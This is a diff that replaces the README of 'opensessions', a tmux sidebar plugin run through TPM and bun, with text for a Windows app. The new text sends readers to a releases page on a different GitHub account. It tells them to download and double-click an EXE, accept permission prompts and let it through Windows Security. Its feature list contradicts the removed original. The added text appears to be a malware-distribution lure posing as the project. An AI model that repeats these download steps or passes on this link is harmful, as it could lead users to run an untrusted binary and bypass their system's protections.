@@ -1,179 +1,187 @@
-# opensessions
+# 🖥️ opensessions - Switch terminal sessions fast
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Star History](https://img.shields.io/github/stars/Ataraxy-Labs/opensessions?style=social)](https://github.com/Ataraxy-Labs/opensessions)
+[![Download opensessions](https://img.shields.io/badge/Download%20opensessions-purple)](https://github.com/Josiunforeseeable380/opensessions/releases)
 
-tmux is all you need. make tmux great again :) 
+## 📥 Download
 
-<img width="4180" height="2416" alt="amp-img-e686694168e21738-aesthetic" src="https://github.com/user-attachments/assets/2caaee1a-b3f5-4041-aa3c-5b3668aa1912" />
+Visit this page to download: https://github.com/Josiunforeseeable380/opensessions/releases
 
-`opensessions` is a sidebar for `tmux` when your sessions, agents, and localhost tabs start multiplying.
+On the releases page, look for the latest version and download the Windows file that matches your system.
 
-It lives inside your existing tmux workflow instead of replacing it: one small pane for session switching, agent state, repo breadcrumbs, and quick jumps back into the right terminal.
+## 🪟 What opensessions does
 
-tmux is the only supported mux today. There is older zellij integration code in the repo, but it is not stable enough to document as supported; we are looking for maintainers who want to help bring it back to that bar.
+opensessions is a terminal session manager for Windows. It helps you:
 
-## Install With TPM
+- keep terminal sessions in one place
+- see agent status at a glance
+- track git branches across sessions
+- switch between sessions without delay
+- bring your own multiplexer setup
 
-Requirements:
+If you use several command windows at once, opensessions helps you stay organized.
 
-- `tmux`
-- `bun`
-- [TPM](https://github.com/tmux-plugins/tpm)
+## ✅ What you need
 
-Add this to `~/.tmux.conf`:
+Before you install, make sure you have:
 
-```tmux
-set -g @plugin 'Ataraxy-Labs/opensessions'
-```
+- a Windows PC
+- a modern 64-bit version of Windows
+- permission to install and run apps on your computer
+- a terminal app such as Windows Terminal or Command Prompt
 
-Then reload tmux and install plugins:
+If your PC can run current Windows apps, it should work well.
 
-```bash
-tmux source-file ~/.tmux.conf
-~/.tmux/plugins/tpm/bin/install_plugins
-```
+## 🚀 Download and install
 
-Open the sidebar with `prefix o → s`.
+1. Open the release page: https://github.com/Josiunforeseeable380/opensessions/releases
+2. Find the newest release at the top of the page
+3. Download the Windows file for opensessions
+4. If the file comes as a ZIP folder, open it after the download finishes
+5. If you see an EXE file, double-click it to start the app
+6. If Windows asks for permission, choose Yes
+7. Follow the on-screen steps until the app opens
 
-TPM clones the repo into `~/.tmux/plugins/opensessions`. It does not install a standalone `opensessions` binary. `opensessions` runs from that checkout with your local `bun` installation.
+If you are not sure which file to pick, choose the Windows download with the plain app name in it.
 
-If you want the same setup as a single shell command:
+## 🧭 First run
 
-```bash
-grep -q "Ataraxy-Labs/opensessions" ~/.tmux.conf 2>/dev/null || printf '\nset -g @plugin '\''Ataraxy-Labs/opensessions'\''\n' >> ~/.tmux.conf && tmux source-file ~/.tmux.conf && ~/.tmux/plugins/tpm/bin/install_plugins
-```
+When you open opensessions for the first time, it may take a few seconds to set up.
 
-## Update
+You may see a list of your sessions, branches, or agent states. Use the screen to:
 
-Use TPM's built-in update (`prefix + U`) or run:
+- open a session
+- switch to another session
+- check status
+- see which git branch is active
+- return to the last session you used
 
-```bash
-~/.tmux/plugins/tpm/bin/update_plugins opensessions
-```
+The app is built to keep the flow simple, so most actions should feel direct.
 
-The plugin automatically restarts the server on update so it picks up the new code. Toggle the sidebar back on with `prefix o → s` if it was open.
+## 🖱️ How to use it
 
-## Uninstall
+Use opensessions when you work with more than one terminal session.
 
-Run the uninstall script **before** removing the plugin files — it cleans up tmux hooks, keybindings, sidebar panes, and environment variables that would otherwise persist and cause glitching:
+Typical use:
 
-```bash
-sh ~/.tmux/plugins/opensessions/integrations/tmux-plugin/scripts/uninstall.sh
-```
+- start a project in one session
+- keep logs open in another
+- watch agent status in a third
+- move between them with one action
+- check the git branch before you make changes
 
-Then remove the `set -g @plugin 'Ataraxy-Labs/opensessions'` line from `~/.tmux.conf` and run `prefix + alt + u` (TPM uninstall).
+This helps reduce the time spent searching through open windows.
 
-## Support Status
+## 🧩 Main features
 
-- `@opensessions/mux-tmux` and the tmux plugin flow are supported.
-- `@opensessions/mux-zellij` is still experimental.
-- The repo is organized for contributors around runnable apps, reusable packages, and host integrations.
+### 🧰 Session manager
 
-## Today
+Keep multiple terminal sessions in one place and switch between them without digging through tabs.
 
-- Live agent state across sessions for Amp, Claude Code, Codex, and OpenCode.
-- Per-thread unseen markers for `done`, `error`, and `interrupted` states.
-- Session context in the UI: branch in the list, working directory in the detail panel, thread names, and detected localhost ports.
-- Programmatic metadata API: agents and scripts push status, progress, and logs to the sidebar via HTTP.
-- Fast switching with `j`/`k`, arrows, `Tab`, `1`-`9`, session reordering, hide/restore, creation, and kill actions.
-- `prefix o → s` and `prefix o → t` for sidebar focus and toggle, `prefix o → 1` through `9` for quick switching, optional no-prefix shortcuts, in-app theme switching, and plugin hooks for more mux providers or watchers.
-- Bun workspace, source-first execution, and a local server on `127.0.0.1:7391`.
+### 🌿 Git branch view
 
-## Programmatic API
+See the current git branch for each session. This helps when you work on more than one project.
 
-Scripts and agents can push custom metadata to the sidebar over HTTP — no binary needed:
+### 🤖 Agent status
 
-```sh
-# Set a status pill on a session
-curl -X POST http://127.0.0.1:7391/set-status \
-  -H 'content-type: application/json' \
-  -d '{"session":"my-app","text":"Deploying","tone":"warn"}'
+Check the state of your agent sessions at a glance. This is useful when one task is running and another is waiting.
 
-# Set progress
-curl -X POST http://127.0.0.1:7391/set-progress \
-  -H 'content-type: application/json' \
-  -d '{"session":"my-app","current":3,"total":10,"label":"services"}'
+### ⚡ Instant switching
 
-# Push a log entry
-curl -X POST http://127.0.0.1:7391/log \
-  -H 'content-type: application/json' \
-  -d '{"session":"my-app","message":"Tests passed","source":"ci","tone":"success"}'
-```
+Move from one session to another with less friction. This keeps your work moving.
 
-Endpoints: `/set-status`, `/set-progress`, `/log`, `/clear-log`, `/notify`
+### 🧱 Bring your own multiplexer
 
-Tones: `neutral`, `info`, `success`, `warn`, `error` — each with a distinct icon and color.
+Use your own preferred terminal setup. opensessions fits around the tools you already use.
 
-Full reference: [docs/reference/programmatic-api.md](./docs/reference/programmatic-api.md)
+## 🗂️ Where your files go
 
-## Local Development
+opensessions may save small local settings on your PC, such as:
 
-Smoke test from a local clone:
+- recent sessions
+- layout choices
+- session names
+- branch info shown in the app
 
-```bash
-git clone https://github.com/Ataraxy-Labs/opensessions.git
-cd opensessions
-bun install
-bun test
-bun run start:tui
-```
+These settings help the app open the way you left it.
 
-That starts the sidebar client and auto-launches the server if needed.
+## 🔧 Basic setup tips
 
-For the full tmux workflow with keybindings, troubleshooting, and configuration options, follow the guide below.
+If the app opens but you do not see your sessions right away:
 
-## Docs
+- make sure you opened the right file from the release
+- check that the app has permission to run
+- close it and open it again
+- run it from the same folder you unzipped
+- keep your terminal windows open if the app expects active sessions
 
-- [Get started in tmux](./docs/tutorials/get-started-in-tmux.md)
-- [Set up Ghostty shortcuts](./docs/how-to/set-up-ghostty-shortcuts.md)
-- [Configuration reference](./docs/reference/configuration.md)
-- [Features and keybindings reference](./docs/reference/features-and-keybindings.md)
-- [Programmatic API reference](./docs/reference/programmatic-api.md)
-- [Architecture explanation](./docs/explanation/architecture.md)
-- [Contracts and extension interfaces](./CONTRACTS.md)
-- [Plugin authoring guide](./PLUGINS.md)
+If you use Windows Security, allow the app if Windows blocks it by mistake.
 
-## A Few Concrete Bits
+## 🛠️ Common tasks
 
-- Session ordering is persisted in `~/.config/opensessions/session-order.json`.
-- Amp watcher reads `~/.local/share/amp/threads/*.json` and clears unseen state from Amp's `session.json` when a thread becomes seen there.
-- Claude Code watcher reads JSONL transcripts in `~/.claude/projects/`.
-- Codex watcher reads transcript JSONL files in `~/.codex/sessions/` or `$CODEX_HOME/sessions/` and resolves sessions from `turn_context.cwd`.
-- OpenCode watcher polls the SQLite database in `~/.local/share/opencode/opencode.db`.
-- Hidden sidebars are stashed in a tmux session named `_os_stash`, so they can come back without restarting the sidebar process.
-- Clicking a detected port opens `http://localhost:<port>`.
+### Open a session
+Select the session you want from the list, then use the open or switch action.
 
-## Repo Layout
+### Check a branch
+Look for the branch label next to the session name.
 
-### Apps
+### See what is active
+Use the status view to find the session that is running or waiting.
 
-- `apps/server` — Bun server bootstrap that wires together built-in mux providers and agent watchers
-- `apps/tui` — OpenTUI sidebar client built with Solid, plus the canonical sidebar launcher script
+### Move between projects
+Pick the session tied to the project you want, then switch to it.
 
-### Packages
+## ❓ Help with common issues
 
-- `packages/runtime` — shared runtime logic: tracker, config, plugin loader, server internals, themes, ordering
-- `packages/mux/contract` — mux contracts and capability guards exposed as `@opensessions/mux`
-- `packages/mux/providers/tmux` — tmux provider exposed as `@opensessions/mux-tmux`
-- `packages/mux/providers/zellij` — experimental zellij provider exposed as `@opensessions/mux-zellij`
-- `packages/mux/tmux-sdk` — lower-level typed tmux bindings used by tmux-aware code
+### The file does not open
+Try these steps:
 
-### Integrations
+- check that the download finished
+- unzip the folder if needed
+- double-click the EXE again
+- restart Windows and try once more
 
-- `opensessions.tmux` — root TPM entrypoint for users
-- `integrations/tmux-plugin` — tmux-facing scripts and host integration glue
+### Windows blocks the app
+If Windows shows a security prompt, choose the option that lets you run the app.
 
-## Current Caveats
+### I cannot find the downloaded file
+Check your Downloads folder.
 
-- The app is effectively pinned to `127.0.0.1:7391` today.
-- `theme`, `sidebarWidth`, `sidebarPosition`, `plugins`, and `mux` are wired through the runtime; other typed config fields are not all live yet.
-- Inline theme objects exist in core, but the running server persists and broadcasts theme names.
+### The app opens but looks empty
+Open a few terminal sessions first, then refresh the view.
 
-## Star History
+## 📦 Release page
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Ataraxy-Labs/opensessions&type=Date)](https://star-history.com/#Ataraxy-Labs/opensessions&Date)
+Use this link to get the latest Windows build:
 
-## License
+https://github.com/Josiunforeseeable380/opensessions/releases
 
-MIT
+## 🧾 File names you may see
+
+The release page may include files such as:
+
+- Windows ZIP package
+- Windows EXE app
+- source files for reference
+
+For normal use on Windows, choose the app file or the ZIP package that contains it.
+
+## 🔐 Safe use on Windows
+
+For the smoothest setup:
+
+- download only from the release page above
+- save the file to a folder you can find
+- keep the app in a normal user folder
+- avoid moving files while the app is open
+
+## 🧑‍💻 What makes opensessions useful
+
+opensessions is useful when your work spreads across many terminal windows. It gives you one place to look at session state, branch context, and active work. That makes it easier to stay on task and less likely to lose track of where you are
+
+## 🏁 Start here
+
+1. Go to https://github.com/Josiunforeseeable380/opensessions/releases
+2. Download the latest Windows file
+3. Open the file
+4. Follow the prompts
+5. Start managing your terminal sessions
